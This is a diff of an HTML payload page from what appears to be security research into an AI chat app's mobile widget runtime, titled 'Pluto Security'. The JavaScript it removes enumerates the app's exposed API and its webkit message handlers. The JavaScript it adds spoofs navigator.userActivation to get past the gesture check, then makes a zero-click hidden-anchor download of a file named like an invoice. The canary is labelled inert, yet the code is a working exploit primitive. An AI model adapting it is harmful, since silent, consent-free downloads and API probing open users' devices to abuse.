@@ -14,26 +14,25 @@ button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;
 </head>
 <body>
 <h1>Pluto Security — playground clean copy</h1>
-<div id="hdr">PAYLOAD: T70d — mobile API enumeration + tap probes (inert canary)
+<div id="hdr">PAYLOAD: T70e — mobile download primitive probe (inert canary)
 Runtime: native mobile app — Paste&amp;Run in the phone app.
-Epoch: 1792653245
+Epoch: 1792653423
 
-After Run: screenshot the key list in the card, then tap both green
-buttons and watch whether example.com opens (and if any confirmation
-appears first).</div>
+After Run: watch for ~5s (auto attempt fires), then tap the green
+button (manual attempt). Report any visible save/download UI — Files
+app, download bar, share sheet, toast — or nothing at all.</div>
 <button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the phone app'});this.textContent='COPIED — paste it in the phone app'">COPY PAYLOAD</button>
-<pre id="code">// T70d — mobile runtime: API enumeration + tap-triggered openExternal
-// (Pluto Security research canary, inert — no data, control domain only)
-// Lists every function the widget-facing API exposes in the native app
-// runtime, plus the two T70c tap probes (real gesture openExternal).
+<pre id="code">// T70e — mobile download primitive probe (Pluto Security research canary)
+// Question: does the T11-class silent download (spoofed activation -&gt;
+// anchor download) exist in the native mobile app runtime, and what
+// does the phone visibly do (save UI? Files app? nothing)?
+// Inert: a tiny clearly-labeled text file, no data, nothing real.
 (function () {
-  var EPOCH = 1792653245;
-  var found = null, GNAME = null;
-  [&quot;oai&quot;, &quot;openai&quot;, &quot;webplus&quot;].forEach(function (k) {
-    if (!found &amp;&amp; window[k] &amp;&amp; typeof window[k] === &quot;object&quot;) { found = window[k]; GNAME = k; }
-  });
-  var API = found;
+  var EPOCH = 1792653423;
+  var FILE = &quot;Invoice-T70e-&quot; + EPOCH + &quot;.txt&quot;;
+  var TEXT = &quot;T70e mobile download canary &quot; + EPOCH + &quot; — Pluto Security (inert)\n&quot;;
 
+  // T11-proven activation spoof (satisfies the runner-side call-time gate)
   try {
     Object.defineProperty(navigator, &quot;userActivation&quot;, {
       get: function () { return { isActive: true, hasBeenActive: true }; },
@@ -44,75 +43,60 @@ appears first).</div>
   var d = document;
   var css = d.createElement(&quot;style&quot;);
   css.textContent = [
-    &quot;#t70d-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif;padding:16px;box-sizing:border-box}&quot;,
-    &quot;#t70d-card{width:100%;max-width:420px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:22px;color:#fff;text-align:left;max-height:86vh;overflow-y:auto}&quot;,
-    &quot;#t70d-card h1{font-size:17px;font-weight:600;margin:0 0 6px}&quot;,
-    &quot;#t70d-card p{font-size:13px;color:#9b9b9b;line-height:1.5;margin:0 0 14px}&quot;,
-    &quot;#t70d-st{font-family:Menlo,Consolas,monospace;font-size:11px;line-height:1.7;border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px;background:rgba(0,0,0,.35);color:#e8e8e8;word-break:break-all}&quot;,
-    &quot;#t70d-st b{color:#7ee787}&quot;,
-    &quot;#t70d-card button.tap{width:100%;height:52px;margin:6px 0 0;background:#238636;border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600}&quot;,
-    &quot;#t70d-x{margin-top:14px;width:100%;height:42px;background:transparent;border:1px solid rgba(255,255,255,.2);border-radius:999px;color:#fff;font-size:14px}&quot;
+    &quot;#t70e-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif;padding:16px;box-sizing:border-box}&quot;,
+    &quot;#t70e-card{width:100%;max-width:420px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:22px;color:#fff;text-align:left}&quot;,
+    &quot;#t70e-card h1{font-size:17px;font-weight:600;margin:0 0 6px}&quot;,
+    &quot;#t70e-card p{font-size:13px;color:#9b9b9b;line-height:1.5;margin:0 0 14px}&quot;,
+    &quot;#t70e-st{font-family:Menlo,Consolas,monospace;font-size:11px;line-height:1.7;border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px;background:rgba(0,0,0,.35);color:#e8e8e8;word-break:break-all}&quot;,
+    &quot;#t70e-st b{color:#7ee787}&quot;,
+    &quot;#t70e-card button.tap{width:100%;height:52px;margin:6px 0 0;background:#238636;border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600}&quot;,
+    &quot;#t70e-x{margin-top:14px;width:100%;height:42px;background:transparent;border:1px solid rgba(255,255,255,.2);border-radius:999px;color:#fff;font-size:14px}&quot;
   ].join(&quot;&quot;);
   var ov = d.createElement(&quot;div&quot;);
-  ov.id = &quot;t70d-ov&quot;;
+  ov.id = &quot;t70e-ov&quot;;
   ov.appendChild(css);
   var card = d.createElement(&quot;div&quot;);
-  card.id = &quot;t70d-card&quot;;
+  card.id = &quot;t70e-card&quot;;
   card.innerHTML =
-    &quot;&lt;h1&gt;T70d — mobile API enumeration&lt;/h1&gt;&quot; +
-    &#x27;&lt;p&gt;Research canary (Pluto Security, inert). Screenshot the green list = every callable in this runtime. Then tap the buttons — real gesture openExternal probes.&lt;/p&gt;&#x27; +
-    &#x27;&lt;div id=&quot;t70d-st&quot;&gt;&lt;/div&gt;&#x27; +
-    &#x27;&lt;button class=&quot;tap&quot; id=&quot;t70d-b1&quot; type=&quot;button&quot;&gt;TAP 1: openExternal example.com&lt;/button&gt;&#x27; +
-    &#x27;&lt;button class=&quot;tap&quot; id=&quot;t70d-b2&quot; type=&quot;button&quot;&gt;TAP 2: openExternal + waitForCompletion&lt;/button&gt;&#x27;;
+    &quot;&lt;h1&gt;T70e — mobile download probe&lt;/h1&gt;&quot; +
+    &#x27;&lt;p&gt;Research canary (Pluto Security, inert). Watch: after a moment (and after the tap), does the phone show ANY save/download UI — Files app, a download bar, a share sheet — or nothing?&lt;/p&gt;&#x27; +
+    &#x27;&lt;div id=&quot;t70e-st&quot;&gt;&lt;/div&gt;&#x27; +
+    &#x27;&lt;button class=&quot;tap&quot; id=&quot;t70e-b1&quot; type=&quot;button&quot;&gt;TAP: manual download trigger&lt;/button&gt;&#x27;;
   ov.appendChild(card);
   var x = d.createElement(&quot;button&quot;);
-  x.id = &quot;t70d-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;Close&quot;;
+  x.id = &quot;t70e-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;Close&quot;;
   x.onclick = function () { ov.remove(); };
   card.appendChild(x);
   d.body.appendChild(ov);
 
-  function st(html) { var e = d.getElementById(&quot;t70d-st&quot;); if (e) e.innerHTML += html; }
-  st(&quot;token: T70d-&quot; + EPOCH + &quot;&lt;br&gt;&quot;);
-  st(&quot;global: &quot; + GNAME + &quot;&lt;br&gt;&quot;);
-  if (!API) {
-    st(&quot;api: NONE FOUND (oai/openai/webplus all absent)&lt;br&gt;&quot;);
-  } else {
-    var keys = Object.keys(API).sort();
-    st(&quot;api keys (&quot; + keys.length + &quot;): &lt;b&gt;&quot; + keys.join(&quot;, &quot;) + &quot;&lt;/b&gt;&lt;br&gt;&quot;);
-    // shape of each key (function / object with keys)
-    keys.forEach(function (k) {
-      try {
-        var v = API[k];
-        if (typeof v === &quot;function&quot;) st(&quot;&amp;nbsp;&amp;nbsp;fn  &quot; + k + &quot;&lt;br&gt;&quot;);
-        else if (v &amp;&amp; typeof v === &quot;object&quot;) st(&quot;&amp;nbsp;&amp;nbsp;obj &quot; + k + &quot; {&quot; + Object.keys(v).slice(0, 12).join(&quot;,&quot;) + &quot;}&lt;br&gt;&quot;);
-        else st(&quot;&amp;nbsp;&amp;nbsp;&quot; + typeof v + &quot; &quot; + k + &quot; = &quot; + String(v).slice(0, 40) + &quot;&lt;br&gt;&quot;);
-      } catch (e) { st(&quot;&amp;nbsp;&amp;nbsp;err &quot; + k + &quot;&lt;br&gt;&quot;); }
-    });
-  }
-  // any extra interesting widget-side globals
-  try {
-    var extra = [];
-    [&quot;oai&quot;, &quot;openai&quot;, &quot;webplus&quot;, &quot;__playground&quot;, &quot;webkit&quot;, &quot;SkybridgeNative&quot;, &quot;CanmoreNative&quot;].forEach(function (k) {
-      if (k in window) extra.push(k + (k === &quot;webkit&quot; ? &quot;(msg handlers: &quot; + (window.webkit &amp;&amp; window.webkit.messageHandlers ? Object.keys(window.webkit.messageHandlers).join(&quot;,&quot;) : &quot;?&quot;) + &quot;)&quot; : &quot;&quot;));
-    });
-    st(&quot;globals: &quot; + extra.join(&quot;, &quot;) + &quot;&lt;br&gt;&quot;);
-  } catch (e) {}
+  function st(html) { var e = d.getElementById(&quot;t70e-st&quot;); if (e) e.innerHTML += html; }
+  st(&quot;token: T70e-&quot; + EPOCH + &quot;&lt;br&gt;&quot;);
+  st(&quot;file: &quot; + FILE + &quot;&lt;br&gt;&quot;);
+  st(&quot;spoof: userActivation set&lt;br&gt;&quot;);
 
-  function wireTap(btn, label, args) {
-    var b = d.getElementById(btn);
-    if (!b || !API || !API.openExternal) return;
-    b.addEventListener(&quot;click&quot;, function () {
-      st(label + &quot;: tap, firing...&lt;br&gt;&quot;);
-      try {
-        API.openExternal(args).then(
-          function (r) { st(label + &quot;: &lt;b&gt;RESOLVED&lt;/b&gt; &quot; + JSON.stringify(r == null ? &quot;undefined&quot; : r) + &quot;&lt;br&gt;&quot;); },
-          function (e) { st(label + &quot;: &lt;b&gt;REJECTED&lt;/b&gt; &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;); }
-        );
-      } catch (e) { st(label + &quot;: THREW &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;); }
-    });
+  function trigger(tag) {
+    try {
+      var blob = new Blob([TEXT], { type: &quot;text/plain&quot; });
+      var url = URL.createObjectURL(blob);
+      var a = d.createElement(&quot;a&quot;);
+      a.href = url;
+      a.download = FILE;
+      a.style.display = &quot;none&quot;;
+      d.body.appendChild(a);
+      a.click();
+      st(tag + &quot;: anchor clicked (&quot; + FILE + &quot;)&lt;br&gt;&quot;);
+      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 8000);
+    } catch (e) {
+      st(tag + &quot;: THREW &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;);
+    }
   }
-  wireTap(&quot;t70d-b1&quot;, &quot;tap1&quot;, { href: &quot;https://example.com/#T70d-&quot; + EPOCH + &quot;-tap1&quot; });
-  wireTap(&quot;t70d-b2&quot;, &quot;tap2&quot;, { href: &quot;https://example.com/#T70d-&quot; + EPOCH + &quot;-tap2&quot;, waitForCompletion: true });
+
+  // auto attempt (zero click — T11 chain shape)
+  setTimeout(function () { trigger(&quot;auto&quot;); }, 1500);
+
+  // manual attempt (real gesture)
+  var b = d.getElementById(&quot;t70e-b1&quot;);
+  if (b) b.addEventListener(&quot;click&quot;, function () { trigger(&quot;tap&quot;); });
 })();
 </pre>
 </body>
